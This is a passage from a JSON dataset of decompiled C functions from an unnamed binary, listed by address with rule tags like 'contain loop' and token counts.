        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00406b4a)\n// WARNING: Removing unreachable block (ram,0x00406b50)\n// WARNING: Removing unreachable block (ram,0x00406b52)\n\nvoid fcn.00406b36(void)\n\n{\n    return;\n}\n",
        "token_count": 65
    },
    "0040640b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040640b(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406d00(0x7f7910, 0xc);\n    fcn.00406868(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x7fb398;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x7fb394;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x0040644f;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.00404d3b(arg_8h_00);\ncode_r0x0040644f:\n        fcn.00404d3b(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00406472();\n    fcn.00406d45();\n    return;\n}\n",
        "token_count": 398
    },
    "005481f9": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.005481f9(void)\n\n{\n    uint32_t unaff_retaddr;\n    \n    *0x639eb2b5 = *0x639eb2b5 | unaff_retaddr;\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 88
    }
}